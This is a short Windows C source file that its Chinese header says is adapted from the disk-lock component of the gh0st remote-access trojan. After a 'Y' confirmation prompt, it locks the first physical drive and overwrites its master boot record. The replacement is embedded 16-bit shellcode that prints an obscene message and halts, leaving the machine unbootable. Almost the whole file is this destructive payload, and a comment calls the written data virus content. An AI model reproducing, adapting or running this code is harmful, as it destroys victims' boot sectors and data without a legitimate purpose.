
/*
源自gh0st远控3.6版的源码中对版权保护的硬盘锁，只做了少量修改
通过这一篇文章了解 http://blog.csdn.net/qiurisuixiang/article/details/7314882 
2013/7/11 by赫
*/
#include "stdafx.h"
int KillMBR() ;
unsigned char scode[] = 
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c" 
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x48\x45\x20" 
"\x46\x75\x63\x6b\x20\x79\x6f\x75\x0D\x3C\x3C\x3C\x2B\x3E\x3E\x3E"; 

int _tmain(int argc, _TCHAR* argv[])
{
	_wsetlocale(LC_ALL, L"chs");
	wchar_t YesOrNo;
	wprintf(L"***********************************");
	wprintf(L"此程序有高度危险性是否要执行？\n");
	wprintf(L"继续请输入Y（大写）,输入其他退出\n");
	wprintf(L"By赫");
	wprintf(L"***********************************");
	YesOrNo = getwchar();

	if(YesOrNo == L'Y')
	{
		KillMBR();
	}

	getwchar();

	getwchar();
	return 0;
}
 
int KillMBR() 
{ 
    HANDLE hDevice; 
    DWORD dwBytesWritten, dwBytesReturned; 
    BYTE pMBR[512] = {0}; 
     
    // 重新构造MBR 
    memcpy(pMBR, scode, sizeof(scode) - 1); 
    pMBR[510] = 0x55; 
    pMBR[511] = 0xAA; 
     
    hDevice = CreateFile 
        ( 
        L"\\\\.\\PHYSICALDRIVE0", 
        GENERIC_READ | GENERIC_WRITE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE, 
        NULL, 
        OPEN_EXISTING, 
        0, 
        NULL 
        ); 
    if (hDevice == INVALID_HANDLE_VALUE) 
        return -1; 
    DeviceIoControl 
        ( 
        hDevice,  
        FSCTL_LOCK_VOLUME,  
        NULL,  
        0,  
        NULL,  
        0,  
        &dwBytesReturned,  
        NULL 
        ); 
    // 写入病毒内容 
    WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL); 
    DeviceIoControl 
        ( 
        hDevice,  
        FSCTL_UNLOCK_VOLUME,  
        NULL,  
        0,  
        NULL,  
        0,  
        &dwBytesReturned,  
        NULL 
        ); 
    CloseHandle(hDevice); 
 
    ExitProcess(-1); 
    return 0; 
} 